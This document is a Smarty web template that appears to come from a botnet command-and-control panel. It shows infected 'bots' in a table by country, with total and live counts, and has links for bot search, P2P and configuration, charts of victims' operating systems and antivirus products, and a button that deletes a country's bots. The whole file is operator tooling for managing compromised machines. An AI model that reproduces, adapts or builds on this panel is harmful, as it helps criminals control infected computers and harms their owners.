{if $_SESSION.user->access.ampie.index eq on || $_SESSION.user->access.bots.filter_countrys eq on || $_SESSION.user->access.bots.search eq on}
<div class="top_menu">

<div class="top_menu_left">
<a href="#" onclick="bots_get_country('');">{$lang.abot}</a>
{if $_SESSION.user->access.bots.search eq on}<a href="/bots/search.html">{$lang.poibot}</a>&nbsp;{/if}
{if $_SESSION.user->access.bots.p2p eq on}<a href="/bots/p2p.html">{$lang.p2p}</a>&nbsp;{/if}
<a href="/bots/config.html">{$lang.config}</a>&nbsp;
</div>

<div class="top_menu_right">
{if $_SESSION.user->access.ampie.index eq on}<a href="#" onclick="get_ampie_window('bots_all');">{$lang.gall}</a>&nbsp;<a href="#" onclick="get_ampie_window('bots_live');">{$lang.glive}</a>&nbsp;<a href="#" onclick="get_ampie_window('os');">{$lang.gos}</a>&nbsp;<a href="#" onclick="get_ampie_window('antivir');">{$lang.gab}</a>&nbsp;<a href="#" onclick="get_window('/ampie/rights.html?window=1', {ldelim}name:'rights', widht: 800{rdelim});">{$lang.gri}</a>&nbsp;{/if}
</div>
</div>
<hr />
{/if}

{if $_SESSION.user->access.bots.filter_country_list eq on}
<div style="text-align: right; padding-right: 10px; padding-left: 10px">
<form name="filters_lits" id="filters_lits" action="/bots/index.html?" method="post" enctype="application/x-www-form-urlencoded" onsubmit="return get_hax({ldelim}url: '/bots/index.html?ajax=1',method: 'post',id: 'content', form: this.name {rdelim});">
{$lang.pref}: {if $_SESSION.user->config.prefix eq ''}<select id="prefix" name="prefix" style="width:600px">
<option value="">{$lang.all}</option>
{foreach from=$prefix item=pref}
<option value="{$pref}"{if $_SESSION.search.prefix eq $pref}selected="selected"{/if}>{$pref}</option>
{/foreach}
</select>
{else}
<select id="prefix" name="prefix" style="width:600px">
<option value="">{$_SESSION.user->config.prefix}</option>
</select>
{/if}
<hr />

{$lang.sortco}: <select name="sort" style="width:600px">
<option value=""{if $_SESSION.search.sort eq ''} selected="selected"{/if}>{$lang.stan}</option>
<option value="country1"{if $_SESSION.search.sort eq 'country1'} selected="selected"{/if}>{$lang.poimsv}</option>
<option value="country2"{if $_SESSION.search.sort eq 'country2'} selected="selected"{/if}>{$lang.poimsy}</option>
<option value="alls1"{if  $_SESSION.search.sort eq 'alls1'} selected="selected"{/if}>{$lang.pkvbv}</option>
<option value="alls2"{if  $_SESSION.search.sort eq 'alls2'} selected="selected"{/if}>{$lang.pkvby}</option>
<option value="lives1"{if  $_SESSION.search.sort eq 'lives1'} selected="selected"{/if}>{$lang.pkjbv}</option>
<option value="lives2"{if  $_SESSION.search.sort eq 'lives2'} selected="selected"{/if}>{$lang.pkjy}</option>
</select>
<hr />
<input type="submit" name="update" value="{$lang.upda}" style="width:100%" />
</form>
</div>
<hr />
{/if}
<br />
<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.msns}: {$_SESSION.user->config.cp.bots}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vcou}: {$counts.alls}</div>
</div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 60%; text-align: center">{$lang.country}</td>
<td style="width: 20%; text-align: center">{$lang.kolbot}</td>
<td style="width: 20%; text-align: center">{$lang.livebot}</td>
<td>&nbsp;</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$key}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;">
<th onclick="bots_get_country('{$item.code}');">{$item.name}</th>
<th onclick="bots_get_country('{$item.code}');">{$item.count}</th>
<th onclick="bots_get_country('{$item.code}');">{$item.live}</th>
<th onclick="return false;"><a href="#" onclick="if(confirm('{$lang.dyvbs} \'{$item.name}\'?')) get_hax({ldelim}url: '/bots/delete_country.html?str={$item.code}&amp;ajax=1&amp;page={$Cur.page}',method: 'get',id: 'content'{rdelim});"><img src="/images/icons/note_delete.gif" alt="{$lang.delet}" title="{$lang.evbs}" border="0" /></a></th>
</tr>
{/foreach}
<tr class="bgp3">
<td style="width: 60%; text-align: center">{$lang.vsycbys}</td>
<td style="width: 20%; text-align: center">{if $counts.all ne $counts.allz}{$counts.all} / {$counts.allz}{else}{$counts.all}{/if}</td>
<td style="width: 20%; text-align: center">{if $counts.live ne $counts.livez}{$counts.live} / {$counts.livez}{else}{$counts.live}{/if}</td>
<td colspan="2">&nbsp;</td>
</tr>
</table>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>